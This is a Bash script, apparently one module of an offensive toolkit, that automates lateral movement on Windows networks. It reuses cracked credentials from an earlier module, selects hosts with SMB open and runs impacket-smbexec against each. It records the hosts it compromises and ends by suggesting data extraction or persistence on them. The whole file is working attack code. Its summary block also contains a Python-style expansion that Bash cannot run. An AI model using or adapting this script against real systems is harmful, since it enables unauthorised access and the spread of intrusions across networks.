#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export USE_LATEST=true
source "$SCRIPT_DIR/config.sh"

ASSETS_FILE="$LOOT_DIR/live_assets.json"
LATERAL_LOG="$LOOT_DIR/lateral_results.txt"

echo -e "${YELLOW}>>> [CatTeam 模块: 横向移动] 打击集群启动 <<<${NC}"

# -------- 凭据获取 (OPSEC 安全协议) --------
# ⚠️ 绝不通过命令行参数传递密码！
# 命令行参数会暴露在 ~/.zsh_history 和 ps aux 中！
# 安全的凭据获取顺序: 环境变量 → 05模块自动加载 → 交互式盲输入

L_USER="${LATERAL_USER:-}"
L_PASS="${LATERAL_PASS:-}"
L_DOMAIN="${LATERAL_DOMAIN}"

if [ -z "$L_USER" ] || [ -z "$L_PASS" ]; then
    # 尝试从 cracked_passwords.txt 自动提取（如果 05 模块跑过）
    if [ -f "$LOOT_DIR/cracked_passwords.txt" ] && [ -s "$LOOT_DIR/cracked_passwords.txt" ]; then
        log "${CYAN}[~] 发现 05 模块破解结果，自动加载第一条凭据...${NC}"
        # 数据契约: 05 模块使用 --outfile-format=1,2,3
        # 输出格式: hash_full_string:hex_plain:plain_password
        # NTLMv2 hash 格式: user::domain:challenge:...
        # 因此 cut -d: -f1 取用户名，awk $NF 取最后字段(明文密码)
        FIRST_CRACKED=$(head -1 "$LOOT_DIR/cracked_passwords.txt")
        if [ -z "$L_USER" ]; then
            L_USER=$(echo "$FIRST_CRACKED" | cut -d: -f1)
        fi
        if [ -z "$L_PASS" ]; then
            L_PASS=$(echo "$FIRST_CRACKED" | awk -F: '{print $NF}')
        fi
        log "${GREEN}[+] 自动加载凭据: ${L_DOMAIN}\\${L_USER}${NC}"
    fi

    # 仍然为空则交互式安全输入 (read -s 不回显密码)
    if [ -z "$L_USER" ]; then
        read -p "$(echo -e "${CYAN}输入用户名: ${NC}")" L_USER
    fi
    if [ -z "$L_PASS" ]; then
        read -s -p "$(echo -e "${CYAN}输入密码 (不回显): ${NC}")" L_PASS
        echo ""
    fi
fi

if [ -z "$L_USER" ] || [ -z "$L_PASS" ]; then
    log "${RED}[!] 凭据不完整，无法执行横向移动。${NC}"
    log "${CYAN}[~] 用法: LATERAL_USER=admin LATERAL_PASS=xxx $0${NC}"
    exit 1
fi

log "[-] 执行凭据: ${L_DOMAIN}\\${L_USER} (密码已隐藏)"

# -------- 提取 SMB 目标 (纯 Python，不依赖 jq) --------

if [ ! -f "$ASSETS_FILE" ] || [ ! -s "$ASSETS_FILE" ]; then
    log "${RED}[!] 缺少 live_assets.json！请先执行 make fast${NC}"
    exit 1
fi

log "[-] 从 live_assets.json 提取 SMB (445) 目标..."

SMB_TARGETS=$(python3 -c "
import json, sys
with open('$ASSETS_FILE') as f:
    data = json.load(f)
targets = [ip for ip, info in data.get('assets', {}).items() if 445 in info.get('ports', [])]
if not targets:
    sys.exit(1)
print('\n'.join(targets))
" 2>/dev/null) || {
    log "${RED}[!] 未发现开放 SMB (445) 的目标。${NC}"
    exit 1
}

SMB_COUNT=$(echo "$SMB_TARGETS" | wc -l | tr -d ' ')
log "${GREEN}[+] 锁定 ${SMB_COUNT} 个 SMB 目标：${NC}"
echo "$SMB_TARGETS" | while read -r ip; do
    log "    → $ip"
done

# -------- 检查战车内 Impacket --------

if ! docker ps --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
    log "${RED}[!] 战车未运行！请先执行 make probe${NC}"
    exit 1
fi

if ! docker exec "$CONTAINER_NAME" which impacket-psexec >/dev/null 2>&1; then
    log "${YELLOW}[~] 战车内未发现 Impacket，尝试安装...${NC}"
    docker exec "$CONTAINER_NAME" pip3 install impacket -q 2>/dev/null || {
        log "${RED}[!] Impacket 安装失败，请手动在战车内安装。${NC}"
        exit 1
    }
fi

# -------- 横向认证测试 --------

log ""
log "${CYAN}[~] 开始横向认证测试 (使用 impacket-smbexec)...${NC}"

# 将目标列表写入工作区
echo "$SMB_TARGETS" > "$LOOT_DIR/smb_targets.txt"

# 初始化结果文件
echo "# CatTeam 横向移动结果 - $(date)" > "$LATERAL_LOG"
echo "# 凭据: ${L_DOMAIN}\\${L_USER}" >> "$LATERAL_LOG"
echo "========================" >> "$LATERAL_LOG"

SUCCESS_COUNT=0

for IP in $SMB_TARGETS; do
    log "${YELLOW}[*] 目标: $IP — 发起 SMB 认证测试...${NC}"

    # 使用 smbexec 执行 whoami 验证凭据有效性
    # smbexec 比 psexec 更安静 (不上传二进制文件)
    RESULT=$(docker exec "$CONTAINER_NAME" timeout 15 \
        impacket-smbexec "${L_DOMAIN}/${L_USER}:${L_PASS}@${IP}" \
        -command "whoami" 2>&1) || true

    if echo "$RESULT" | grep -qi "nt authority\|${L_USER}\|admin"; then
        log "  ${GREEN}[+] ✅ 认证成功！目标 $IP 已沦陷${NC}"
        echo "[SUCCESS] $IP - $(echo "$RESULT" | grep -i "whoami\|authority\|admin" | head -1)" >> "$LATERAL_LOG"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    elif echo "$RESULT" | grep -qi "STATUS_LOGON_FAILURE\|LOGON_FAILURE"; then
        log "  ${RED}[✗] 认证失败 — 凭据无效${NC}"
        echo "[FAILED] $IP - Logon Failure" >> "$LATERAL_LOG"
    elif echo "$RESULT" | grep -qi "STATUS_ACCESS_DENIED\|ACCESS_DENIED"; then
        log "  ${YELLOW}[!] 认证成功但权限不足${NC}"
        echo "[PARTIAL] $IP - Access Denied (creds valid, insufficient privs)" >> "$LATERAL_LOG"
    else
        log "  ${YELLOW}[?] 未知响应，请人工分析${NC}"
        echo "[UNKNOWN] $IP - $RESULT" >> "$LATERAL_LOG"
    fi
done

# -------- 战果汇报 --------

log ""
log "${PURPLE}${'='*50}${NC}"
log "  📋 横向移动战果汇总"
log "${PURPLE}${'='*50}${NC}"
log "  目标总数:   ${SMB_COUNT}"
log "  沦陷数量:   ${GREEN}${SUCCESS_COUNT}${NC}"
log "  详细报告:   ${LATERAL_LOG}"

if [ "$SUCCESS_COUNT" -gt 0 ]; then
    log ""
    log "  ${GREEN}🎯 已沦陷目标:${NC}"
    grep "\[SUCCESS\]" "$LATERAL_LOG" | while IFS= read -r line; do
        log "    $line"
    done
    log ""
    log "  ${CYAN}[~] 下一步: 对沦陷主机进行数据提取或权限维持${NC}"
fi
